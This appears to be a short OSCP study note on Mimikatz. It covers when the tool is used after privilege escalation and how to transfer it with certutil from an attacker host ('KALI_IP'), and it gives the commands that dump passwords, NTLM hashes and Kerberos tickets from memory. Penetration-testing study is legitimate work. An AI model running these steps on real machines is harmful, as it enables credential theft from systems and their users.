# Mimikatz — Credential Extraction (OSCP)

Mimikatz is a **credential extraction tool** for Windows.
It is used **after you already have high privileges** on a Windows machine.


## **🧠 When You Use Mimikatz**

You use Mimikatz when:
- You have a **shell on Windows**
- You are **Administrator or SYSTEM**
- You want to extract:
    
    - Plaintext passwords
    - NTLM hashes
    - Kerberos tickets
    
Typical timing:
> Initial foothold → Priv esc → **Mimikatz**


## **Getting Mimikatz Onto the Target**
From **Kali**:
```bash
python3 -m http.server 80
```
On **Windows target**:
```bash
certutil -urlcache -f http://KALI_IP/mimikatz.exe mimikatz.exe
```


## **Running Mimikatz**
From Windows shell:
```cmd
mimikatz.exe
```
### **Enable Debug Privileges**
```cmd
privilege::debug
```
### **Dump Credentials from Memory**
```cmd
sekurlsa::logonpasswords
```
This pulls:

- Usernames
- Domains
- Plaintext passwords (sometimes)
- NTLM hashes

## **Related Notes**

- [[winPEAS]]
- [[Priv_Esc]]
- [[Hashcat]]
- [[Impacket]]
- [[File_Transfer]]